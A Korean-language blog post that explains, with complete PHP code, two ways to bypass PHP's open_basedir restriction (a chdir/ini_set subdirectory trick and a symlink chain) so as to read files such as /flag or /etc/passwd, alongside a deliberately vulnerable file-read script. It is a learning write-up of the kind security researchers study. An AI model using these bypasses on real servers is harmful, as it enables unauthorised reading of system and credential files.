---
layout: post
title: "PHP Open_basedir bypass"
description: "PHP Open_basedir bypass."
categories: PHP, bypass, open_basedir

---

## 시작하기에 앞서

오탈자, 혹은 잘못된 부분은 언제든 환영합니다 :)

## 왜 갑자기 open_basedir?

잠자기전 트위터를 보다가 굉장히 흥미로운 트윗을 보았습니다. Thanks to, [@Blaklis_](<https://twitter.com/Blaklis_>)

> **Source :** https://twitter.com/Blaklis_/status/1111586655134203904

처음에는 단순히 라업을 적은듯 하였는데, 내용을 읽어보니 일단 제가 모르는 것이었습니다.  [[Go to link]](<http://91.121.31.50/phuck3.txt>)

요약을 하자면 open_basedir이 설정되어있을 경우, 이를 우회해 /(root)로 변경이 가능합니다.

이말은 즉,  open_basedir이 /var/www/html에 걸려있더라도 /etc/passwd와 같은 서버 설정파일을 읽을 수 있다는 것입니다. 

총 2가지 방법(subdirectory, symlink)을 통해 open_basedir을 우회하려고 합니다.

## open_basedir bypass

#### Initialize Setting

서버의 설정(php.ini)는 다음과 같습니다.

```ini
open_basedir = /var/www/html
```

index.php의 소스는 다음과 같습니다.

```php
error_reporting(E_ALL);
ini_set('display_errors',1);
echo file_get_contents($_GET['f']);
```

/flag를 읽을려고 하면 당연히 에러(open_basedir restriction in effect)가 발생할 것입니다.

참고로 정상적인 경우 open_basedir을 /로 변경해도, open_basedir은 변경되지 않습니다. 고로 /flag를 읽을 수 없습니다.

이제 이를 우회하여 /flag파일을 읽어봅니다.

#### 1 - Using subdirectory

subdirectory를 이용하여 open_basedir을 /로 변경하는 방법입니다.

이를 위해서는 open_basedir안에 폴더가 존재해야합니다.

테스트를 위한 서버의 구조는 다음과 같습니다.

```
root@shpik:/var/www/html/shpik/04# ls -al
total 20
drwxr-xr-x 3 root root 4096 Apr  5 04:45 .
drwxr-xr-x 6 root root 4096 Apr  5 04:16 ..
-rw-r--r-- 1 root root  341 Apr  5 04:21 index.php
drwxr-xr-x 2 root root 4096 Apr  5 04:19 mashiro
-rw-r--r-- 1 root root  100 Apr  5 04:45 test.php
```

mashiro라는 폴더를 이용하여 /flag파일을 읽어봅시다.

코드는 다음과 같습니다.

```php
error_reporting(E_ALL);
ini_set('display_errors',1);
chdir('mashiro');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
echo file_get_contents($_GET['f']);
```

open_basedir을 우회하여 /flag파일이 정상적으로 읽힙니다.

#### 2 - Using symlink

/를 가르키는 symlink를 생성하여 open_basedir을 우회하는 방법입니다.

이는 ../를 이용해 parent directory로 이동하기 때문에 적당한 깊이의 폴더가 필요합니다.

```
root@shpik:/var/www/html/shpik/04/symlink# tree
.
├── a
│   └── b
│       └── c
│           └── d
│               └── e
│                   └── f
│                       └── g
│                           └── h
│                               └── j
│                                   └── j
│                                       └── k
└── index.php
```

이를 링크로 하나 만들어줍니다.

```php
symlink('/var/www/html/shpik/04/symlink/a/b/c/d/e/f/g/h/j/j/k','shiina');
```

그러면 아래와 같은 symlink가 생성됩니다.

```
shiina -> /var/www/html/shpik/04/symlink/a/b/c/d/e/f/g/h/j/j/k
```

위에서 생성한 symlink(shiina) 기준으로 하위로 내려가는 symlink(goto)를 하나 더 생성해줍니다.

그리고 ini_set을 통해 open_basedir을 재 설정해주는데, 방금 생성한 symlink(goto/)를 추가해줍니다.

마지막으로 symlink(shiina)는 unlink해줍니다. 

```php
symlink('shiina/../../../../../../','goto');
ini_set('open_basedir','/var/www/html:goto/');
unlink('shiina');
symlink('/var/www/html/','shiina');
```

그러면 goto라는 symlink는 /를 가르키게 되고 `file_get_contents('goto/flag');`를 하게 되면 open_basedir을 우외하여 파일을 읽을 수 있습니다. 아래는 풀 코드입니다.

```php
error_reporting(E_ALL);
ini_set('display_errors',1);
symlink('/var/www/html/shpik/04/symlink/a/b/c/d/e/f/g/h/j/j/k','shiina');
symlink('shiina/../../../../../../','goto');
ini_set('open_basedir','/var/www/html:goto/');
unlink('shiina');
symlink('/var/www/html/','shiina');
echo file_get_contents('./goto/flag');
highlight_file(__FILE__);
```
